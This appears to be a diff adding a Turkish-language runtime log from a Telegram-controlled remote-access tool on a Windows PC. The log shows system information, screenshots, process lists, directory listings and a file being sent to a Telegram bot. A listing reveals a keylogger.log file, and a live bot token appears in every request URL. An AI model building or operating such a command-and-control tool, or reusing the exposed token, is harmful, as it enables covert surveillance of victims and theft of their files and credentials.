@@ -1,0 +1,545 @@
+2025-05-26 21:22:03,270 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:22:03,271 - INFO - Mesaj g�nderildi: Uzaktan Kontrol Ba�lat�ld�
+
+Sistem Bilgileri:
+Sist...
+2025-05-26 21:22:03,957 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:22:03,958 - INFO - Mesaj g�nderildi: Komutlar i�in /help yaz�n...
+2025-05-26 21:22:04,647 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:22:04,650 - INFO - Al�nan komut: /screenshot
+2025-05-26 21:22:05,853 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendDocument "HTTP/1.1 200 OK"
+2025-05-26 21:22:05,854 - INFO - Dosya g�nderildi: screenshot_20250526_212204.png
+2025-05-26 21:22:05,855 - INFO - Al�nan komut: /stop
+2025-05-26 21:22:06,562 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:22:06,563 - INFO - Mesaj g�nderildi: Program durduruldu!...
+2025-05-26 21:23:19,389 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:23:19,390 - INFO - Mesaj gönderildi: Uzaktan Kontrol Başlatıldı
+
+Sistem Bilgileri:
+Sist...
+2025-05-26 21:23:20,195 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:23:20,196 - INFO - Mesaj gönderildi: Komutlar için /help yazın...
+2025-05-26 21:23:20,871 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:23:20,872 - INFO - Alınan komut: /screenshot
+2025-05-26 21:23:22,134 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendDocument "HTTP/1.1 200 OK"
+2025-05-26 21:23:22,134 - INFO - Dosya gönderildi: screenshot_20250526_212320.png
+2025-05-26 21:23:22,136 - INFO - Alınan komut: /stop
+2025-05-26 21:23:22,844 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:23:22,845 - INFO - Mesaj gönderildi: Program durduruldu!...
+2025-05-26 21:24:14,317 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:24:14,318 - INFO - Mesaj gönderildi: Uzaktan Kontrol Başlatıldı
+
+Sistem Bilgileri:
+Sist...
+2025-05-26 21:24:14,974 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:24:14,975 - INFO - Mesaj gönderildi: Komutlar için /help yazın...
+2025-05-26 21:24:15,637 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:24:15,638 - INFO - Alınan komut: /screenshot
+2025-05-26 21:24:16,847 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendDocument "HTTP/1.1 200 OK"
+2025-05-26 21:24:16,848 - INFO - Dosya gönderildi: screenshot_20250526_212415.png
+2025-05-26 21:24:16,850 - INFO - Alınan komut: /stop
+2025-05-26 21:24:17,565 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:24:17,566 - INFO - Mesaj gönderildi: Program durduruldu!...
+2025-05-26 21:25:25,669 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:25:25,670 - INFO - Mesaj gönderildi: Uzaktan Kontrol Başlatıldı
+
+Sistem Bilgileri:
+Sist...
+2025-05-26 21:25:26,468 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:25:26,469 - INFO - Mesaj gönderildi: Komutlar için /help yazın...
+2025-05-26 21:25:27,109 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:25:27,110 - INFO - Alınan komut: /screenshot
+2025-05-26 21:25:28,342 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendDocument "HTTP/1.1 200 OK"
+2025-05-26 21:25:28,343 - INFO - Dosya gönderildi: screenshot_20250526_212527.png
+2025-05-26 21:25:28,344 - INFO - Alınan komut: /stop
+2025-05-26 21:25:29,040 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:25:29,041 - INFO - Mesaj gönderildi: Program durduruldu!...
+2025-05-26 21:26:35,730 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:26:35,731 - INFO - Mesaj gönderildi: Uzaktan Kontrol Başlatıldı
+
+Sistem Bilgileri:
+Sist...
+2025-05-26 21:26:36,410 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:26:36,411 - INFO - Mesaj gönderildi: Komutlar için /help yazın...
+2025-05-26 21:26:37,059 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:26:37,061 - WARNING - Program henüz başlatılmadı. Sadece /help komutu kullanılabilir.
+2025-05-26 21:26:37,854 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:26:37,855 - INFO - Mesaj gönderildi: Güvenlik nedeniyle bu komut reddedildi. Lütfen dah...
+2025-05-26 21:26:37,856 - WARNING - Program henüz başlatılmadı. Sadece /help komutu kullanılabilir.
+2025-05-26 21:26:38,626 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:26:38,627 - INFO - Mesaj gönderildi: Güvenlik nedeniyle bu komut reddedildi. Lütfen dah...
+2025-05-26 21:26:39,306 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:26:39,307 - INFO - Mesaj gönderildi: 
+                Kullanılabilir Komutlar:
+        ...
+2025-05-26 21:26:39,308 - WARNING - Komutlar arası bekleme süresi yetersiz. 3 saniye bekleyin.
+2025-05-26 21:26:40,008 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:26:40,009 - INFO - Mesaj gönderildi: Güvenlik nedeniyle bu komut reddedildi. Lütfen dah...
+2025-05-26 21:26:40,010 - WARNING - Komutlar arası bekleme süresi yetersiz. 3 saniye bekleyin.
+2025-05-26 21:26:40,676 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:26:40,676 - INFO - Mesaj gönderildi: Güvenlik nedeniyle bu komut reddedildi. Lütfen dah...
+2025-05-26 21:26:40,677 - WARNING - Komutlar arası bekleme süresi yetersiz. 3 saniye bekleyin.
+2025-05-26 21:26:41,344 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:26:41,345 - INFO - Mesaj gönderildi: Güvenlik nedeniyle bu komut reddedildi. Lütfen dah...
+2025-05-26 21:26:44,005 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:26:48,682 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:26:51,323 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:26:53,750 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:26:54,571 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:26:54,571 - INFO - Mesaj gönderildi: Dizin İçeriği (.):
+[Dosya] keylogger.log (7546 byt...
+2025-05-26 21:26:57,302 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:27:02,007 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:27:03,730 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:27:04,406 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:27:04,407 - INFO - Mesaj gönderildi: Dizin değiştirildi: C:\Users\syefo\OneDrive\Belgel...
+2025-05-26 21:27:06,067 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:27:06,069 - WARNING - Komutlar arası bekleme süresi yetersiz. 3 saniye bekleyin.
+2025-05-26 21:27:06,828 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:27:06,829 - INFO - Mesaj gönderildi: Güvenlik nedeniyle bu komut reddedildi. Lütfen dah...
+2025-05-26 21:27:08,469 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:27:09,276 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:27:09,276 - INFO - Mesaj gönderildi: Bilinmeyen komut: ls
+Kullanılabilir komutlar için ...
+2025-05-26 21:27:09,277 - WARNING - Komutlar arası bekleme süresi yetersiz. 3 saniye bekleyin.
+2025-05-26 21:27:10,096 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:27:10,097 - INFO - Mesaj gönderildi: Güvenlik nedeniyle bu komut reddedildi. Lütfen dah...
+2025-05-26 21:27:11,810 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:27:12,537 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:27:12,538 - INFO - Mesaj gönderildi: Bilinmeyen komut: cd ..
+Kullanılabilir komutlar iç...
+2025-05-26 21:27:12,539 - WARNING - Komutlar arası bekleme süresi yetersiz. 3 saniye bekleyin.
+2025-05-26 21:27:13,300 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:27:13,302 - INFO - Mesaj gönderildi: Güvenlik nedeniyle bu komut reddedildi. Lütfen dah...
+2025-05-26 21:27:15,009 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:27:15,748 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:27:15,749 - INFO - Mesaj gönderildi: Bilinmeyen komut: cd ..
+Kullanılabilir komutlar iç...
+2025-05-26 21:27:15,750 - WARNING - Komutlar arası bekleme süresi yetersiz. 3 saniye bekleyin.
+2025-05-26 21:27:16,470 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:27:16,470 - INFO - Mesaj gönderildi: Güvenlik nedeniyle bu komut reddedildi. Lütfen dah...
+2025-05-26 21:27:19,188 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:27:23,442 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:27:24,101 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:27:24,102 - INFO - Mesaj gönderildi: Bilinmeyen komut: ls
+Kullanılabilir komutlar için ...
+2025-05-26 21:27:26,773 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:27:31,420 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:27:33,082 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:27:33,772 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:27:33,773 - INFO - Mesaj gönderildi: Bilinmeyen komut: cd Masaüstü
+Kullanılabilir komut...
+2025-05-26 21:27:35,440 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:27:35,443 - WARNING - Komutlar arası bekleme süresi yetersiz. 3 saniye bekleyin.
+2025-05-26 21:27:36,136 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:27:36,137 - INFO - Mesaj gönderildi: Güvenlik nedeniyle bu komut reddedildi. Lütfen dah...
+2025-05-26 21:27:38,799 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:27:41,377 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:27:42,050 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:27:42,051 - INFO - Mesaj gönderildi: Bilinmeyen komut: ls
+Kullanılabilir komutlar için ...
+2025-05-26 21:27:44,709 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:27:46,437 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:27:47,174 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:27:47,175 - INFO - Mesaj gönderildi: 
+                Kullanılabilir Komutlar:
+        ...
+2025-05-26 21:27:49,869 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:27:51,562 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:27:52,645 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:27:52,646 - INFO - Mesaj gönderildi: Çalışan İşlemler:
+PID: 0 - İsim: System Idle Proce...
+2025-05-26 21:27:55,319 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:27:57,008 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:27:57,715 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:27:57,716 - INFO - Mesaj gönderildi: Dizin İçeriği (.):
+[Dosya] cursor al exploit.txt (...
+2025-05-26 21:28:00,377 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:28:02,630 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:28:03,380 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:28:03,381 - INFO - Mesaj gönderildi: Dizin İçeriği (.):
+[Dosya] cursor al exploit.txt (...
+2025-05-26 21:28:06,132 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:28:07,783 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:28:08,554 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:28:08,555 - INFO - Mesaj gönderildi: Dizin değiştirildi: C:\Users\syefo\OneDrive\Belgel...
+2025-05-26 21:28:10,244 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:28:10,247 - WARNING - Komutlar arası bekleme süresi yetersiz. 3 saniye bekleyin.
+2025-05-26 21:28:10,925 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:28:10,926 - INFO - Mesaj gönderildi: Güvenlik nedeniyle bu komut reddedildi. Lütfen dah...
+2025-05-26 21:28:13,590 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:28:15,256 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:28:15,937 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:28:15,938 - INFO - Mesaj gönderildi: Dizin İçeriği (.):
+[Dizin] Bussines
+[Dizin] Cyber ...
+2025-05-26 21:28:18,603 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:28:23,295 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:28:25,955 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:28:30,612 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:28:33,253 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:28:36,114 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:28:37,145 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendDocument "HTTP/1.1 200 OK"
+2025-05-26 21:28:37,146 - INFO - Dosya gönderildi: wp13648523.png
+2025-05-26 21:28:39,792 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:28:44,531 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:28:46,201 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:28:46,891 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:28:46,892 - INFO - Mesaj gönderildi: 
+                Kullanılabilir Komutlar:
+        ...
+2025-05-26 21:28:49,550 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:28:51,584 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:28:52,348 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:28:52,350 - INFO - Mesaj gönderildi: Dizin değiştirildi: C:\Users\syefo\OneDrive\Belgel...
+2025-05-26 21:28:54,209 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:28:54,210 - WARNING - Komutlar arası bekleme süresi yetersiz. 3 saniye bekleyin.
+2025-05-26 21:28:54,879 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:28:54,880 - INFO - Mesaj gönderildi: Güvenlik nedeniyle bu komut reddedildi. Lütfen dah...
+2025-05-26 21:28:57,542 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:28:59,189 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:28:59,885 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:28:59,887 - INFO - Mesaj gönderildi: Dizin değiştirildi: C:\Users\syefo\OneDrive\Belgel...
+2025-05-26 21:29:02,543 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:29:06,563 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:29:07,214 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:29:07,215 - INFO - Mesaj gönderildi: Dizin değiştirildi: C:\Users\syefo\OneDrive...
+2025-05-26 21:29:09,709 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:29:10,362 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:29:10,363 - INFO - Mesaj gönderildi: Dizin değiştirildi: C:\Users\syefo...
+2025-05-26 21:29:12,281 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:29:12,283 - WARNING - Komutlar arası bekleme süresi yetersiz. 3 saniye bekleyin.
+2025-05-26 21:29:12,970 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:29:12,971 - INFO - Mesaj gönderildi: Güvenlik nedeniyle bu komut reddedildi. Lütfen dah...
+2025-05-26 21:29:14,615 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
